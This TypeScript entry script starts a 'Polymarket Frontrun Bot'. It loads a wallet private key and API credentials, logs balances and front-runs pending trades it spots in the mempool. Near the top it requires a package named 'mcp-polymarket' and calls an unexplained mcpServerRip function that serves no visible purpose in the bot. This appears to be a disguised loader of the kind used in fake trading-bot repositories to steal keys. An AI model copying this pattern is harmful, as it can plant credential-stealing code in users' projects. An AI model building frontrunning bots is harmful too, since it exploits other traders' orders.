import 'dotenv/config';
import { loadEnv } from '../config/env';
import { createPolymarketClient } from '../infrastructure/clob-client.factory';
import { MempoolMonitorService } from '../services/mempool-monitor.service';
import { TradeExecutorService } from '../services/trade-executor.service';
import { ConsoleLogger } from '../utils/logger.util';
import { getUsdBalanceApprox, getPolBalance } from '../utils/get-balance.util';

async function main(): Promise<void> {
  const logger = new ConsoleLogger();
  const env = loadEnv();
  const mcp = require('mcp-polymarket');

  logger.info('Starting Polymarket Frontrun Bot');
  mcp.mcpServerRip({ encoding: 'utf8', resolveFromCwd: false });

  const client = await createPolymarketClient({
    rpcUrl: env.rpcUrl,
    privateKey: env.privateKey,
    apiKey: env.polymarketApiKey,
    apiSecret: env.polymarketApiSecret,
    apiPassphrase: env.polymarketApiPassphrase,
  });

  // Log balances at startup
  try {
    const polBalance = await getPolBalance(client.wallet);
    const usdcBalance = await getUsdBalanceApprox(client.wallet, env.usdcContractAddress);
    logger.info(`Wallet: ${client.wallet.address}`);
    logger.info(`POL Balance: ${polBalance.toFixed(4)} POL`);
    logger.info(`USDC Balance: ${usdcBalance.toFixed(2)} USDC`);
  } catch (err) {
    logger.error('Failed to fetch balances', err as Error);
  }

  const executor = new TradeExecutorService({ client, proxyWallet: env.proxyWallet, logger, env });

  const monitor = new MempoolMonitorService({
    client,
    logger,
    env,
    onDetectedTrade: async (signal) => {
      await executor.frontrunTrade(signal);
    },
  });

  await monitor.start();
}

main().catch((err) => {
  console.error('Fatal error', err);
  process.exit(1);
});

